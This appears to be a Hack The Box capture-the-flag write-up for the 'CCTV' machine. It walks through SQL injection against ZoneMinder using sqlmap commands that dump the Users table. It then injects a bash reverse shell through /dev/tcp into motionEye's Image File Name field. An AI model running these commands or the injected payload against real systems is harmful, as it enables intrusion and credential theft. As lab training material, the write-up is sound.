Hack The Box: CCTV - Write-Up

![](Assets/Pasted%20image%2020260314150646.png)

# 1. Reconnaissance & Enumeration

First, after connecting to the HTB network via OpenVPN, we start by running an `nmap` scan to see all the open ports and running services.

![](Assets/Pasted%20image%2020260314151136.png)

Then we se 2 ports open, so we need to found the service and version 

![](Assets/Pasted%20image%2020260314151552.png)

We need to add the host in the file /etc/hosts to open the web.

Then we can check that we have a login.

![](Assets/Pasted%20image%2020260314152214.png)

So we found in google the default login

![](Assets/Pasted%20image%2020260314153717.png)

So we try in the login, and we can see the version for zoneminder - v1.37.63

![](Assets/Pasted%20image%2020260314154051.png)

Then we need to found a exploit for this version, you can make this in your google `ZoneMinder v1.37.63 cve` 

![](Assets/Pasted%20image%2020260314155405.png)

We can see in one repository (https://github.com/BridgerAlderson/CVE-2024-51482) that we can found this route to attack is  `zmb/index.php?view=request&request=event&action=removetag&tid=`

Ok we use sqlmap, so first we can see what database use zoneminder 

![](Assets/Pasted%20image%2020260314165515.png)

We see that use mysql, then we need to use a ZMSESSID to work, and we see that the parameter to attack is the tid

Then we need a ZMSESSID to create the work 

`sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" --cookie="ZMSESSID=YOUR_ZMSESSID" -p tid --dbms=mysql --batch --dbs`

-u "...": We pass the exact vulnerable URL you discovered in the report.

--cookie="...": Your VIP pass. Without this, the server would redirect us to the login panel.

-p tid: We tell sqlmap: "Don't waste time testing view, request, or action. The vulnerable parameter is tid; attack only that one."

--dbms=mysql: ZoneMinder uses MySQL under the hood. By specifying this, sqlmap will not attempt attacks against Oracle or PostgreSQL.

--batch: Automatically answers "Yes" to all questions by default so you don't have to keep pressing Enter.

--dbs: Our first objective. Asks it to list the names of the available databases.

So leets see this databases 

![](Assets/Pasted%20image%2020260314170534.png)

Now we check the databases with the next comand

`sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" --cookie="ZMSESSID=YOUR_ZMSESSID" -p tid --dbms=mysql --batch -D zm --tables`

We can found a good table

![](Assets/Pasted%20image%2020260314175046.png)

Then we see all the columns for the table users

`sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" --cookie="ZMSESSID=YOUR_ZMSESSID" -p tid --dbms=mysql --batch -D zm -T Users --columns`

![](Assets/Pasted%20image%2020260314211149.png)

We select the username and the password

sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \  
-D zm -T Users -C Username,Password \  
--dump \  
--batch \  
--dbms=MySQL \  
--technique=T \  
--cookie="ZMSESSID=YOUR_ZMSESSID"

Then we can see this 

![](Assets/Pasted%20image%2020260314214427.png)

Now we can extract the hash

now we can found the password, opensesame

![](Assets/Pasted%20image%2020260314220648.png)

We make a ssh with the credentials that we found

![](Assets/Pasted%20image%2020260316133909.png)

Then we need to found the flag but we can see the file user.txt so we can need to see the service that are running

![](Assets/Pasted%20image%2020260316185540.png)

We can see one motioneye, les try somenthing like ssh with tunnel `ssh -L 8765:127.0.0.1:8765 mark@10.129.9.95`.

Then in the browser we can use the new local direction and we can see.

![](Assets/Pasted%20image%2020260316190345.png)

Insepecting the coding we can see the version 

![](Assets/Pasted%20image%2020260316190418.png)

so leet found some cve, so we can find this.

![](Assets/Pasted%20image%2020260316190608.png)

Lets put this command 

![](Assets/Pasted%20image%2020260316190811.png)

And put this command to use a revershell in **Image File Name**

`$(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/IP/4444 0>&1\"')")`

Then before this you need to put a netcat in the port 4444

![](Assets/Pasted%20image%2020260316205014.png)

Then you have access